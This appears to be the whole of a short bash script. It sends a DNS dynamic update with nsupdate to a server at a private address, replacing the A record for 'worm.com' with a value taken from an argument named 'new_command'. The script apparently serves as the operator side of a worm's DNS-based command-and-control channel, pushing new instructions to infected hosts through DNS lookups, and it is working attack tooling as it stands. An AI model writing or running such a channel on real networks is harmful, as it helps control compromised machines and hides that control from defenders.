#!/bin/bash

dns_server=10.160.0.53

new_command=$1

update_command=$(cat <<EOF
server $dns_server
zone com.
update delete worm.com A
update add worm.com 1 A $new_command
send
EOF
)

printf "$update_command" | nsupdate
